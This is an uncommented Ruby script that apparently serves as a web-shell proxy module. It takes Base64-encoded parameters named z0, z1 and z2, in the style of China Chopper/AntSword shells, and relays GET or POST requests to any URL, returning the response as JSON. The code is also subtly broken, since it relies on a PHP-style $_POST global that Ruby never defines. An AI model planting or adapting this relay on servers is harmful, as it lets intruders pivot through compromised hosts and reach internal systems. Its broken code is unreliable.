require 'base64'
require 'json'
require 'net/http'
require 'uri'

def http_get(url_str)
  unless url_str.start_with?('http://', 'https://')
    url_str = "http://#{url_str}"
  end

  uri = URI.parse(url_str)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  http.read_timeout = 15

  request = Net::HTTP::Get.new(uri.request_uri)
  
  response = http.request(request)
  
  if response.is_a?(Net::HTTPRedirection) && response['location']
    return http_get(response['location'])
  end

  [response.code.to_i, response.body]
rescue => e
  [0, "Error: #{e.message}"]
end

def http_post(url_str, data)
  unless url_str.start_with?('http://', 'https://')
    url_str = "http://#{url_str}"
  end

  uri = URI.parse(url_str)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  http.read_timeout = 15

  request = Net::HTTP::Post.new(uri.request_uri)
  request['Content-Type'] = 'application/x-www-form-urlencoded'
  request.body = data

  response = http.request(request)
  [response.code.to_i, response.body]
rescue => e
  [0, "Error: #{e.message}"]
end

def main
  z0_param = $_POST ? $_POST['z0'] : nil
  action = z0_param ? Base64.decode64(z0_param.to_s) : ''

  result = {
    'status' => 'error',
    'action' => action,
    'http_code' => nil,
    'data' => nil
  }

  case action
  when 'get'
    z1_param = $_POST ? $_POST['z1'] : nil
    url = z1_param ? Base64.decode64(z1_param.to_s) : ''

    if url.empty?
      result['data'] = 'Missing URL'
    else
      http_code, body = http_get(url)
      result['status'] = 'ok'
      result['http_code'] = http_code
      result['data'] = body
    end

  when 'post'
    z1_param = $_POST ? $_POST['z1'] : nil
    z2_param = $_POST ? $_POST['z2'] : nil
    url  = z1_param ? Base64.decode64(z1_param.to_s) : ''
    data = z2_param ? Base64.decode64(z2_param.to_s) : ''

    if url.empty?
      result['data'] = 'Missing URL'
    else
      http_code, body = http_post(url, data)
      result['status'] = 'ok'
      result['http_code'] = http_code
      result['data'] = body
    end

  else
    result['data'] = 'Invalid action'
  end

  print JSON.generate(result)
end

main